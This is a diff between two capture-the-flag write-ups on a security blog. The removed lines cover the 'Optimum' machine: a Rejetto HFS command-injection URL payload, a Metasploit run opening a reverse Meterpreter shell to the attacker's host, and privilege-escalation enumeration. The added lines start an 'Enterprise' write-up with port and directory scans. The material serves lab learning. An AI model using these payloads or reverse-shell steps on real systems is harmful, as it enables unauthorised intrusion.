@@ -137,16 +137,16 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
   <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />
 
 
-  <title>Optimum write-up - The Portal of Knowledge</title>
-  <meta property='og:title' content="Optimum write-up - The Portal of Knowledge">
+  <title>Enterprise write-up - The Portal of Knowledge</title>
+  <meta property='og:title' content="Enterprise write-up - The Portal of Knowledge">
   <meta property="og:type" content="article">
-  <meta name="description" content="Write-up for the Optimum machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Optimum του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
-  <meta property="og:description" content="Write-up for the Optimum machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Optimum του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
-  <meta property="og:image" content="https://alamot.github.io/images/optimum.jpg">
+  <meta name="description" content="Write-up for the Enterprise machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Enterprise του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:description" content="Write-up for the Enterprise machine (www.hackthebox.eu). Ανάλυση του μηχανήματος Enterprise του www.hackthebox.eu (διαθέσιμη μόνο στα αγγλικά).">
+  <meta property="og:image" content="https://alamot.github.io/images/space.jpg">
   <meta property="og:image:width" content="768" />
   <meta property="og:image:height" content="384" />
 
-<meta property="og:url" content="https://alamot.github.io/optimum_writeup/">
+<meta property="og:url" content="https://alamot.github.io/enterprise_writeup/">
 
 
 <script type="application/ld+json">
@@ -157,15 +157,15 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
       "@type":"WebPage",
       "@id":"https://alamot.github.io/"
     },
-    "headline": "Optimum write-up |  ",
+    "headline": "Enterprise write-up |  ",
     "image": {
       "@type": "ImageObject",
       "url": "",
       "height": 700,
       "width": 700
     },
-    "datePublished": "2017-10-28T00:00:00JST",
-    "dateModified": "2017-10-28T00:00:00JST",
+    "datePublished": "2018-03-19T00:00:00JST",
+    "dateModified": "2018-03-19T00:00:00JST",
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
@@ -201,15 +201,28 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
 <li><a href="#enumeration">Enumeration</a>
 <ul>
 <li><a href="#port-scanning">Port scanning</a></li>
-</ul></li>
-<li><a href="#exploitation">Exploitation</a>
+<li><a href="#brute-forcing-directories-and-files">Brute forcing directories and files</a>
 <ul>
-<li><a href="#using-metasploit">Using Metasploit</a></li>
-<li><a href="#without-metasploit">Without Metasploit</a>
-<ul>
-<li><a href="#using-python-and-netcat">Using python and netcat</a></li>
-<li><a href="#using-python-and-powershell">Using python and powershell</a></li>
+<li><a href="#port-80">Port 80</a></li>
+<li><a href="#port-443">Port 443</a></li>
+<li><a href="#port-8080">Port 8080</a></li>
 </ul></li>
+</ul></li>
+<li><a href="#sql-injection">SQL Injection</a>
+<ul>
+<li><a href="#dumping-the-wordpress-database">Dumping the wordpress database</a></li>
+<li><a href="#dumping-the-joomladb-database">Dumping the joomladb database</a></li>
+</ul></li>
+<li><a href="#getting-shells">Getting shells</a>
+<ul>
+<li><a href="#getting-shell-on-wordpress-container">Getting shell on Wordpress container</a></li>
+<li><a href="#getting-shell-on-joomla-container">Getting shell on Joomla container</a></li>
+</ul></li>
+<li><a href="#privilege-escalation">Privilege escalation</a>
+<ul>
+<li><a href="#escaping-from-the-joomla-container">Escaping from the Joomla container</a></li>
+<li><a href="#getting-root">Getting root</a></li>
+<li><a href="#autopwn-script">Autopwn script</a></li>
 </ul></li>
  
       
@@ -252,13 +265,13 @@ if (language) {
   <div class="row">
     <div class="col-md-12">
       <article class="single centered">
-        <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+        <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
         <div class="body">
-            <header lang="en"><h1 id="title" class="title">Optimum write-up</h1></header>
-            <header lang="el"><h1 class="title">Ανάλυση του Optimum</h1></header>
+            <header lang="en"><h1 id="title" class="title">Enterprise write-up</h1></header>
+            <header lang="el"><h1 class="title">Ανάλυση του Enterprise</h1></header>
             <i class="fa fa-calendar topmargin7"  aria-hidden="true"></i>  
-            <time lang="en" class="topmargin7">28 Oct 2017</time>
-            <time lang="el" class="topmargin7">28 Οκτ 2017</time>
+            <time lang="en" class="topmargin7">19 Mar 2018</time>
+            <time lang="el" class="topmargin7">19 Μαρ 2018</time>
             &middot; <i class="fa fa-folder-open-o topmargin7" aria-hidden="true"></i>
             
               <a class="label label-success topmargin7" href='https://alamot.github.io/categories/cybersecurity'>
@@ -288,15 +301,28 @@ if (language) {
 <li><a href="#enumeration">Enumeration</a>
 <ul>
 <li><a href="#port-scanning">Port scanning</a></li>
-</ul></li>
-<li><a href="#exploitation">Exploitation</a>
+<li><a href="#brute-forcing-directories-and-files">Brute forcing directories and files</a>
 <ul>
-<li><a href="#using-metasploit">Using Metasploit</a></li>
-<li><a href="#without-metasploit">Without Metasploit</a>
-<ul>
-<li><a href="#using-python-and-netcat">Using python and netcat</a></li>
-<li><a href="#using-python-and-powershell">Using python and powershell</a></li>
+<li><a href="#port-80">Port 80</a></li>
+<li><a href="#port-443">Port 443</a></li>
+<li><a href="#port-8080">Port 8080</a></li>
 </ul></li>
+</ul></li>
+<li><a href="#sql-injection">SQL Injection</a>
+<ul>
+<li><a href="#dumping-the-wordpress-database">Dumping the wordpress database</a></li>
+<li><a href="#dumping-the-joomladb-database">Dumping the joomladb database</a></li>
+</ul></li>
+<li><a href="#getting-shells">Getting shells</a>
+<ul>
+<li><a href="#getting-shell-on-wordpress-container">Getting shell on Wordpress container</a></li>
+<li><a href="#getting-shell-on-joomla-container">Getting shell on Joomla container</a></li>
+</ul></li>
+<li><a href="#privilege-escalation">Privilege escalation</a>
+<ul>
+<li><a href="#escaping-from-the-joomla-container">Escaping from the Joomla container</a></li>
+<li><a href="#getting-root">Getting root</a></li>
+<li><a href="#autopwn-script">Autopwn script</a></li>
 </ul></li>
 </ul>
 </nav></div>
@@ -309,398 +335,645 @@ if (language) {
 
 <h2 id="port-scanning">Port scanning</h2>
 
-<p>We scan the full range of TCP ports using masscan (Why masscan? Because it&rsquo;s faster than nmap)</p>
+<p>We scan the full range of TCP ports using masscan:
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.61
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.8
-
-Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2017-10-10 09:58:16 GMT
-
+Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-03-15 09:28:39 GMT
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
 Initiating SYN Stealth Scan
 Scanning 1 hosts [65536 ports/host]
-Discovered open port 80/tcp on 10.10.10.8</code></pre></div></div>
+Discovered open port 8080/tcp on 10.10.10.61                                   
+Discovered open port 443/tcp on 10.10.10.61                                    
+Discovered open port 80/tcp on 10.10.10.61                                     
+Discovered open port 22/tcp on 10.10.10.61                                     
+Discovered open port 32812/tcp on 10.10.10.61                                  
+rate:  0.00-kpps, 100.00% done, waiting 0-secs, found=5</code></pre></div></div></p>
 
-<p>We found TCP port 80 open. Let&rsquo;s explore it using nmap:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -A -p80 10.10.10.8
+<p>We found TCP ports 22, 80, 443, 8080 and 32812 open. Let&rsquo;s explore them using nmap:</p>
 
-Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-10 13:10 EEST
-Nmap scan report for 10.10.10.8
-Host is up (0.086s latency).
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -A -p22,80,443,8080,32812 10.10.10.61
 
-PORT   STATE SERVICE VERSION
-80/tcp open  http    HttpFileServer httpd 2.3
-|_http-server-header: HFS 2.3
-|_http-title: HFS /
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-15 11:33 EET
+Nmap scan report for 10.10.10.61
+Host is up (0.10s latency).
+
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      (protocol 2.0)
+| fingerprint-strings: 
+|   NULL: 
+|_    SSH-2.0-OpenSSH_7.4p1 Ubuntu-10
+| ssh-hostkey: 
+|   2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA)
+|   256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA)
+|_  256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (EdDSA)
+80/tcp    open  http     Apache httpd 2.4.10 ((Debian))
+|_http-generator: WordPress 4.8.1
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: USS Enterprise &amp;#8211; Ships Log
+443/tcp   open  ssl/http Apache httpd 2.4.25 ((Ubuntu))
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK
+| Not valid before: 2017-08-25T10:35:14
+|_Not valid after:  2017-09-24T10:35:14
+|_ssl-date: TLS randomness does not represent time
+8080/tcp  open  http     Apache httpd 2.4.10 ((Debian))
+|_http-generator: Joomla! - Open Source Content Management
+|_http-open-proxy: Proxy might be redirecting requests
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Home
+32812/tcp open  unknown
+| fingerprint-strings: 
+|   GenericLines, GetRequest, HTTPOptions: 
+|     _______ _______ ______ _______
+|     |_____| |_____/ |______
+|     |_____ |_____ | | | _ ______|
+|     Welcome to the Library Computer Access and Retrieval System
+|     Enter Bridge Access Code: 
+|     Invalid Code
+|     Terminating Console
+|   NULL: 
+|     _______ _______ ______ _______
+|     |_____| |_____/ |______
+|     |_____ |_____ | | | _ ______|
+|     Welcome to the Library Computer Access and Retrieval System
+|_    Enter Bridge Access Code:
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port22-TCP:V=7.60%I=7%D=3/15%Time=5AAA3DEE%P=x86_64-pc-linux-gnu%r(NULL
+SF:,20,&#34;SSH-2\.0-OpenSSH_7\.4p1\x20Ubuntu-10\n&#34;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port32812-TCP:V=7.60%I=7%D=3/15%Time=5AAA3DEE%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,ED,&#34;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20_______\x20_______\x20\x20______\x20_______\n\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x20\x
+SF:20\x20\|_____\|\x20\|_____/\x20\|______\n\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\|_____\x20\|_____\x20\x20\|\x20\x20\x20\x20\x20\|\x20\|\x20\
+SF:x20\x20\x20\\_\x20______\|\n\nWelcome\x20to\x20the\x20Library\x20Comput
+SF:er\x20Access\x20and\x20Retrieval\x20System\n\nEnter\x20Bridge\x20Access
+SF:\x20Code:\x20\n&#34;)%r(GenericLines,110,&#34;\n\x20\x20\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______\x
+SF:20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20\x
+SF:20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______\n
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\x2
+SF:0\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x20
+SF:to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Syste
+SF:m\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermina
+SF:ting\x20Console\n\n&#34;)%r(GetRequest,110,&#34;\n\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20______
+SF:\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\x20
+SF:\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|______
+SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20\|\
+SF:x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcome\x
+SF:20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20Sys
+SF:tem\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTermi
+SF:nating\x20Console\n\n&#34;)%r(HTTPOptions,110,&#34;\n\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_______\x20_______\x20\x20___
+SF:___\x20_______\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|\x20\x20\x20\
+SF:x20\x20\x20\|\x20\x20\x20\x20\x20\x20\x20\|_____\|\x20\|_____/\x20\|___
+SF:___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\|_____\x20\|_____\x20\x20
+SF:\|\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\\_\x20______\|\n\nWelcom
+SF:e\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20
+SF:System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTe
+SF:rminating\x20Console\n\n&#34;);
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Device type: general purpose
-Running (JUST GUESSING): Microsoft Windows 2012 (89%)
-OS CPE: cpe:/o:microsoft:windows_server_2012
-Aggressive OS guesses: Microsoft Windows Server 2012 (89%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (89%), Microsoft Windows Server 2012 R2 (87%)
-No exact OS matches for host (test conditions non-ideal).
-Network Distance: 2 hops
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre></div></div></p>
+Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.8 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)</code></pre></div></div>
 
-<p>We scan only the 1000 most common UDP ports using nmap because UDP scanning it&rsquo;s very slow.
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -sU --top-ports 1000 10.10.10.8
+<h2 id="brute-forcing-directories-and-files">Brute forcing directories and files</h2>
 
-Nmap scan report for 10.10.10.8
-Host is up (0.075s latency).
-All 1000 scanned ports on 10.10.10.8 are open|filtered</code></pre></div></div></p>
+<h3 id="port-80">Port 80</h3>
 
-<h1 id="exploitation">Exploitation</h1>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirb http://10.10.10.61/
 
-<p>So, we have found that Rejetto HttpFileServer 2.3 is running on TCP port 80. Let&rsquo;s see if there are some exploits for it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ searchsploit rejetto 2.3 -w
--------------------------------------------------------------------------
- Exploit Title                                                         
--------------------------------------------------------------------------
- Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload
-    https://www.exploit-db.com/exploits/30850/
- Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)
-    https://www.exploit-db.com/exploits/34668/
- Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
-    https://www.exploit-db.com/exploits/39161/
- Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution
-    https://www.exploit-db.com/exploits/34852/
--------------------------------------------------------------------------</code></pre></div></div></p>
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
 
-<p>Nice! There are some RCE exploits! :D</p>
+START_TIME: Thu Mar 15 13:28:08 2018
+URL_BASE: http://10.10.10.61/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
-<p>An issue exists due to a poor regex in the file ParserLib.pas</p>
+-----------------
 
-<p>function findMacroMarker(s:string; ofs:integer=1):integer;
-begin result:=reMatch(s, &lsquo;{[.:]|[.:]}||&lsquo;, &rsquo;m!&rsquo;, ofs) end;</p>
+GENERATED WORDS: 4612                                                          
 
-<p>It will not handle null byte:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">http://localhost:80/?search=%00{.exec|cmd.}</code></pre></div></div></p>
+---- Scanning URL: http://10.10.10.61/ ----
++ http://10.10.10.61/index.php (CODE:301|SIZE:0)                                                                   
++ http://10.10.10.61/server-status (CODE:403|SIZE:299)                                                             
+==&gt; DIRECTORY: http://10.10.10.61/wp-admin/                                                                        
+==&gt; DIRECTORY: http://10.10.10.61/wp-content/                                                                      
+==&gt; DIRECTORY: http://10.10.10.61/wp-includes/                                                                     
++ http://10.10.10.61/xmlrpc.php (CODE:405|SIZE:42)                                                                 
 
-<p>So the above request will stop regex from parsing macro, macro will be executed and remote code injection will happen. The exploit basically allow you to run commands like this:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">http://10.10.10.8/?search=%00{.exec|C:\windows\system32\cmd.exe /c echo hello &gt; test.}</code></pre></div></div></p>
+---- Entering directory: http://10.10.10.61/wp-admin/ ----
++ http://10.10.10.61/wp-admin/admin.php (CODE:302|SIZE:0)                                                          
+==&gt; DIRECTORY: http://10.10.10.61/wp-admin/css/                                                                    
+==&gt; DIRECTORY: http://10.10.10.61/wp-admin/images/                                                                 
+==&gt; DIRECTORY: http://10.10.10.61/wp-admin/includes/                                                               
++ http://10.10.10.61/wp-admin/index.php (CODE:302|SIZE:0)                                                          
+==&gt; DIRECTORY: http://10.10.10.61/wp-admin/js/                                                                     
+==&gt; DIRECTORY: http://10.10.10.61/wp-admin/maint/                                                                  
+==&gt; DIRECTORY: http://10.10.10.61/wp-admin/network/                                                                
+==&gt; DIRECTORY: http://10.10.10.61/wp-admin/user/                                                                   
 
-<p>You can also upload/save a file like that:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">http://10.10.10.8/?search=%00{.save|fullpath\filename|data.}</code></pre></div></div></p>
+---- Entering directory: http://10.10.10.61/wp-content/ ----
++ http://10.10.10.61/wp-content/index.php (CODE:200|SIZE:0)                                                        
+==&gt; DIRECTORY: http://10.10.10.61/wp-content/languages/                                                            
+==&gt; DIRECTORY: http://10.10.10.61/wp-content/plugins/                                                              
+==&gt; DIRECTORY: http://10.10.10.61/wp-content/themes/                                                               
+==&gt; DIRECTORY: http://10.10.10.61/wp-content/upgrade/                                                              
+==&gt; DIRECTORY: http://10.10.10.61/wp-content/uploads/                                                              
 
-<h2 id="using-metasploit">Using Metasploit</h2>
+---- Entering directory: http://10.10.10.61/wp-includes/ ----
+==&gt; DIRECTORY: http://10.10.10.61/wp-includes/certificates/                                                        
+==&gt; DIRECTORY: http://10.10.10.61/wp-includes/css/                                                                 
+==&gt; DIRECTORY: http://10.10.10.61/wp-includes/customize/                                                           
+==&gt; DIRECTORY: http://10.10.10.61/wp-includes/fonts/                                                               
+==&gt; DIRECTORY: http://10.10.10.61/wp-includes/images/</code></pre></div></div>
+                                                         
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ msfconsole
-msf &gt; search name:rejetto
+<h3 id="port-443">Port 443</h3>
 
-Matching Modules
-================
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirb https://10.10.10.61/
 
-   Name                                   Disclosure Date  Rank       Description
-   ----                                   ---------------  ----       -----------
-   exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Rejetto HttpFileServer Remote Command Execution
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
 
-msf &gt; use exploit/windows/http/rejetto_hfs_exec 
-msf exploit(rejetto_hfs_exec) &gt; set RHOST 10.10.10.8
-msf exploit(rejetto_hfs_exec) &gt; set RPORT 80 
-msf exploit(rejetto_hfs_exec) &gt; set SRVHOST 10.10.15.150
-msf exploit(rejetto_hfs_exec) &gt; set SRVPORT 60000  
-msf exploit(rejetto_hfs_exec) &gt; info
+START_TIME: Thu Mar 15 12:13:24 2018
+URL_BASE: https://10.10.10.61/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
-  Name       Current Setting  Required  Description
-  ----       ---------------  --------  -----------
-  HTTPDELAY  20               no        Seconds to wait before terminating web server
-  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
-  RHOST      10.10.10.8       yes       The target address
-  RPORT      80               yes       The target port (TCP)
-  SRVHOST    10.10.15.150     yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
-  SRVPORT    60000            yes       The local port to listen on.
-  SSL        false            no        Negotiate SSL/TLS for outgoing connections
-  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
-  TARGETURI  /                yes       The path of the web application
-  URIPATH                     no        The URI to use for this exploit (default is random)
-  VHOST                       no        HTTP server virtual host
+-----------------
 
+GENERATED WORDS: 4612                                                          
 
-msf exploit(rejetto_hfs_exec) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpset
-msf exploit(rejetto_hfs_exec) &gt; set LHOST 10.10.15.150
-msf exploit(rejetto_hfs_exec) &gt; set LPORT 60001
-msf exploit(rejetto_hfs_exec) &gt; exploit
+---- Scanning URL: https://10.10.10.61/ ----
+==&gt; DIRECTORY: https://10.10.10.61/files/                                                                          
++ https://10.10.10.61/index.html (CODE:200|SIZE:10918)                                                             
++ https://10.10.10.61/server-status (CODE:403|SIZE:300)                                                            
 
-[*] Started reverse TCP handler on 10.10.15.150:60001 
-[*] Using URL: http://10.10.15.150:60000/uT3OPJWDAW7b3s
-[*] Server started.
-[*] Sending a malicious request to /
-[*] Payload request received: /uT3OPJWDAW7b3s
-[*] Sending stage (205379 bytes) to 10.10.10.8
-[*] Meterpreter session 1 opened (10.10.15.150:60001 -&gt; 10.10.10.8:49264) at 2017-10-10 13:44:11 +0300
-[!] Tried to delete %TEMP%\IJOurNACYIxzs.vbs, unknown result
-[*] Server stopped.</code></pre></div></div>
+---- Entering directory: https://10.10.10.61/files/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode &#39;-w&#39; if you want to scan it anyway)</code></pre></div></div>
+    
 
-<p>Now we&rsquo;ve got a low privilege shelll as user Kostas:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">C:\Users\kostas\Desktop&gt; whoami
-OPTIMUM\kostas
+<h3 id="port-8080">Port 8080</h3>
 
-meterpreter &gt; sysinfo
-Computer        : OPTIMUM
-OS              : Windows 2012 R2 (Build 9600).
-Architecture    : x64
-System Language : el_GR
-Domain          : HTB
-Logged On Users : 97
-Meterpreter     : x64/windows
-Privilege Escalation</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirb http://10.10.10.61:8080/
 
-<p>Let&rsquo;s search for privilege escalation exploits:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
-$ cd Windows-Exploit-Suggester/
-$ python2 windows-exploit-suggester.py --update</code></pre></div></div></p>
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
 
-<p>We feed in windows-exploit-suggester.py an input file that contains the output from the &lsquo;systeminfo&rsquo; command:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">meterpreter &gt; execute -f &#34;cmd.exe /c systeminfo &gt; systeminfo.txt&#34;</code></pre></div></div></p>
+START_TIME: Thu Mar 15 16:19:44 2018
+URL_BASE: http://10.10.10.61:8080/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
 
-<p>Yes I know that &lsquo;execute&rsquo; has a separate parameter -a to pass the arguments :P. But it also works like that and this scheme is actually clearer. You can also run &lsquo;shell&rsquo; and execute &lsquo;systeminfo &gt; systeminfo.txt&rsquo;. It&rsquo;s the same thing.</p>
+-----------------
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">meterpreter &gt; download systeminfo.txt
+GENERATED WORDS: 4612                                                          
 
-$ cat systeminfo.txt
-Host Name:                 OPTIMUM
-OS Name:                   Microsoft Windows Server 2012 R2 Standard
-OS Version:                6.3.9600 N/A Build 9600
-OS Manufacturer:           Microsoft Corporation
-OS Configuration:          Standalone Server
-OS Build Type:             Multiprocessor Free
-Registered Owner:          Windows User
-Registered Organization:   
-Product ID:                00252-70000-00000-AA535
-Original Install Date:     18/3/2017, 1:51:36 ££
-System Boot Time:          16/10/2017, 9:20:08 ££
-System Manufacturer:       VMware, Inc.
-System Model:              VMware Virtual Platform
-System Type:               x64-based PC
-Processor(s):              1 Processor(s) Installed.
-                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2100 Mhz
-BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
-Windows Directory:         C:\Windows
-System Directory:          C:\Windows\system32
-Boot Device:               \Device\HarddiskVolume1
-System Locale:             el;Greek
-Input Locale:              en-us;English (United States)
-Time Zone:                 (UTC+02:00) Athens, Bucharest
-Total Physical Memory:     4.095 MB
-Available Physical Memory: 2.556 MB
-Virtual Memory: Max Size:  5.503 MB
-Virtual Memory: Available: 3.303 MB
-Virtual Memory: In Use:    2.200 MB
-Page File Location(s):     C:\pagefile.sys
-Domain:                    HTB
-Logon Server:              \\OPTIMUM
-Hotfix(s):                 31 Hotfix(s) Installed.
-                           [01]: KB2959936
-                           [02]: KB2896496
-                           [03]: KB2919355
-                           [04]: KB2920189
-                           [05]: KB2928120
-                           [06]: KB2931358
-                           [07]: KB2931366
-                           [08]: KB2933826
-                           [09]: KB2938772
-                           [10]: KB2949621
-                           [11]: KB2954879
-                           [12]: KB2958262
-                           [13]: KB2958263
-                           [14]: KB2961072
-                           [15]: KB2965500
-                           [16]: KB2966407
-                           [17]: KB2967917
-                           [18]: KB2971203
-                           [19]: KB2971850
-                           [20]: KB2973351
-                           [21]: KB2973448
-                           [22]: KB2975061
-                           [23]: KB2976627
-                           [24]: KB2977629
-                           [25]: KB2981580
-                           [26]: KB2987107
-                           [27]: KB2989647
-                           [28]: KB2998527
-                           [29]: KB3000850
-                           [30]: KB3003057
-                           [31]: KB3014442
-Network Card(s):           1 NIC(s) Installed.
-                           [01]: Intel(R) 82574L Gigabit Network Connection
-                                 Connection Name: Ethernet0
-                                 DHCP Enabled:    No
-                                 IP address(es)
-                                 [01]: 10.10.10.8
-Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</code></pre></div></div>
+---- Scanning URL: http://10.10.10.61:8080/ ----
++ http://10.10.10.61:8080/0 (CODE:200|SIZE:7678)                                                                   
++ http://10.10.10.61:8080/01 (CODE:200|SIZE:8286)                                                                  
++ http://10.10.10.61:8080/02 (CODE:200|SIZE:8595)                                                                  
++ http://10.10.10.61:8080/1 (CODE:200|SIZE:8285)                                                                   
++ http://10.10.10.61:8080/1x1 (CODE:200|SIZE:8287)                                                                 
++ http://10.10.10.61:8080/2 (CODE:200|SIZE:8594)                                                                   
++ http://10.10.10.61:8080/2g (CODE:200|SIZE:8595)                                                                  
++ http://10.10.10.61:8080/about (CODE:200|SIZE:8160)                                                               
++ http://10.10.10.61:8080/About (CODE:200|SIZE:8160)</code></pre></div></div>
+                                                             
 
-<p>I use the &ndash;quiet option to get more compact results. If you want to get more info like links for the exploits remove it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ python2 windows-exploit-suggester.py --database 2017-10-10-mssb.xls --systeminfo ../systeminfo.txt --quiet
-[*] initiating winsploit version 3.3...
-[*] database file detected as xls or xlsx based on extension
-[*] attempting to read from the systeminfo input file
-[+] systeminfo input file read successfully (ISO-8859-2)
-[*] querying database file for potential vulnerabilities
-[*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
-[*] there are now 246 remaining vulns
-[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
-[+] windows version identified as &#39;Windows 2012 R2 64-bit&#39;
-[*] 
-[E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
-[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
-[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
-[E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
-[E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
-[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
